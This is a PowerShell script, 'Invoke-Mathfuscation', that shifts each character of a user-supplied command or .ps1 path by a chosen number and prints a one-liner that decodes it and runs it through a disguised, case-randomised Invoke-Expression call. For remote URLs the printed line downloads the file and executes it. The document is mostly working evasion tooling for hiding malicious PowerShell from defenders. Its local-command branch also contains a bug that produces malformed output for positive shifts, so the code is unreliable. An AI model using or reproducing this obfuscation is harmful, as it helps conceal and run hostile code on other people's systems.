<# 
.SYNOPSIS
    Obfuscate code using math, then execute it. Supports local or remote .ps1 files, or one-liners.
.DESCRIPTION 
     A quick tool that generates uses simple addition to obfuscate individual characters, then executes it using a few random obfuscted invoke expressions.
.NOTES 
    Use at your own risk.
.LINK 
    https://raw.githubusercontent.com/bobby-tablez/Invoke-Mathfuscation/main/Invoke-Mathfuscation.ps1
#>

#Splash screen
$plain = "Invoke-Mathfuscation" 
$mfctd = '"@(115,152,160,153,149,143,87,119,139,158,146,144,159,157,141,139,158,147,153,152)|%{$isXSw=$isXSw+[char]($_-42)};.(gcm ?e[?x])($isXSw)"'

foreach ($char in $plain.ToCharArray()) {
    Write-Host -NoNewline $char -ForegroundColor green
    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 120)
}
Write-Host ""
Write-Host  -NoNewline " + 42 = " -ForegroundColor red

foreach ($char in $mfctd.ToCharArray()) {
    Write-Host -NoNewline $char -ForegroundColor yellow
    Start-Sleep -Milliseconds (Get-Random -Minimum 1 -Maximum 15)
}
Write-Host "`n"

$ErrorActionPreference = [System.Management.Automation.ActionPreference]::Stop

Do{
    # Aquire command to mathfuscate
    $tochar = Read-Host -Prompt "Provide a command, full path to a .ps1 file (local or remote)"

    $raw = $tochar.ToCharArray()
    $space = $tochar.ToCharArray() | %{([int][char]$_) }

    $com = $space -join ","
    $charCom = $space | ForEach-Object {"[char]$_"}
    $char = $charCom -join ","

    # Aquire number to add or subtract
    Try{ 
        $shift = Read-Host -Prompt "`n`nWhat number shoud be added or subtracted?" -ErrorAction stop
    } 
    Catch [System.Net.WebException],[System.IO.IOException] { 
        throw "Was this a number?" 
        break
    }

    # Convert to int
    $shift = [int]$shift

    # Handle positive/negative
    if ($shift -gt 0) {
        $operator = "-"
    } elseif ($shift -lt 0) {
        $operator = "+"
        $pos = [Math]::Abs($shift)
    } else {
        Write-Host "Why would you do this?"
        break
    }

    # Final payload vars
    $added = $space | ForEach-Object {($_+$shift)}
    $charShift = $added | ForEach-Object {"[char]$_"}
    $modChar = $added -join ","

    Write-Host "`nHere's your obfuscated payload!`n" 

    # Randomize case, this is horrible, but it works...
    $aA = @("a","A") | Get-Random;$aB = @("b","B") | Get-Random;$aC = @("c","C") | Get-Random;$aD = @("d","D") | Get-Random;$aE = @("e","E") | Get-Random;$aF = @("f","F") | Get-Random;$aG = @("g","G") | Get-Random;$aH = @("h","H") | Get-Random;$aI = @("i","I") | Get-Random;$aJ = @("j","J") | Get-Random;$aK = @("k","K") | Get-Random;$aL = @("l","L") | Get-Random;$aM = @("m","M") | Get-Random;$aN = @("n","N") | Get-Random;$aO = @("o","O") | Get-Random;$aP = @("p","P") | Get-Random;$aQ = @("q","Q") | Get-Random;$aR = @("r","R") | Get-Random;$aS = @("s","S") | Get-Random;$aT = @("t","T") | Get-Random;$aU = @("u","U") | Get-Random;$aV = @("v","V") | Get-Random;$aW = @("w","W") | Get-Random;$aX = @("x","X") | Get-Random;$aY = @("y","Y") | Get-Random;$aZ = @("z","Z") | Get-Random
    $invokes = @("($aG$aA``$aL ?[?$aE]$aX)","($aG``$aA$aL ?[?$aE]$aX)","($aG$aC``$aM ?[?$aE]$aX)","($aG``$aC$aM ?[?$aE]$aX)","($aG$aA``$aL ?$aE[?$aX])","($aG``$aC$aM ?$aE[?$aX])","(``$aG$aA``$aL $aI`?[?$aX])","($aG``$aC$aM $aI`?[?$aX])")

    # Build the payload string and print
    function CalcPayload() {
        $randVar = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        if($tochar -clike 'http*') {
            Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + "+[$aC$aH$aA$aR](`$_" + $operator + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '(curl -useb $' + $randVar + ')') -ForegroundColor Yellow
        } else {
            Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + "+[$aC$aH$aA$aR](`$_" + $operator + $pos + ')};.'+ (Get-Random -InputObject $invokes) + '($' + $randVar + ')') -ForegroundColor Yellow
        }
    }

    CalcPayload

    # Loop again if Y
    Do{
        $restart = Read-host "Do you want to mathfuscate another? (Y/N)"
        If(($restart -eq "Y") -or ($restart -eq "N")){
            $ver = $true}
        Else{
            write-host -fg Red "Invalid input. (Y/N)?"
        }
    }Until($ver)

}Until($restart -eq "N")

Write-Host -fg Green "Bye!"
